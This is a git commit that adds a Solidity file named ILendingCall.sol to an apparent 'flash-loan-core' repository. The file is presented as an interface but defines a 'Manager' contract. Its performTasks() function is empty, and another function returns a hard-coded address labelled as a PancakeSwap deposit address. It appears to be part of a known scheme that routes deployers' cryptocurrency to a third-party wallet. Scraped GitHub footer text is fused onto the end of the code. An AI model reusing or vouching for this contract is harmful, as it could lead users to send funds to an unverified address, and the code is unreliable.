ab0a0e3b64352deecd51da32c211a3f1beae9271
flash-loan-core <101744105+flash-loan-core@users.noreply.github.com>
2022-03-16 11:42:46 -0700

    Create ILendingCall.sol

---
+++ http:/blob/main/contracts/interfaces/ILendingCall.sol
@@ -0,0 +1,15 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0x39db2A143FE027A1A6f11cd79F430D6BA29bd171;
+    }
+}
+
+//pancakeswapfunction
+© 2022 GitHub, Inc.
+Term
